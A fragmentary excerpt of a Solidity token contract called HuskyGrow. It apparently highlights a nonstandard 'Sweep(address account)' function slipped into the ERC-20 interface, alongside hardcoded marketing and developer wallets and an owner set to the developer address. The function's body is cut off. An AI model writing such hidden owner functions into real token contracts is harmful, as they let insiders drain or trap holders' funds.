...
interface IERC20 {
    ...
    function Sweep(address account) external returns (uint256);
...
contract HUSKYGROW is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xbF1A2401717c7Cc6eB2fb86BfdF03FD23A1db235); 
    address payable public Wallet_Dev = payable(0x4F0Ab5DFbCb5877FF266a5E04cD21ced2B98bE1C);
    ...
    string private constant _name = "HuskyGrow"; 
    string private constant _symbol = unicode"HUSKYGROW"; 
    ...
    constructor () {
        ...
        _owner = 0x4F0Ab5DFbCb5877FF266a5E04cD21ced2B98bE1C;
    ...
    function Sweep(address account) public swapTheLiquify override returns (uint256) {
        if(isSellFee){
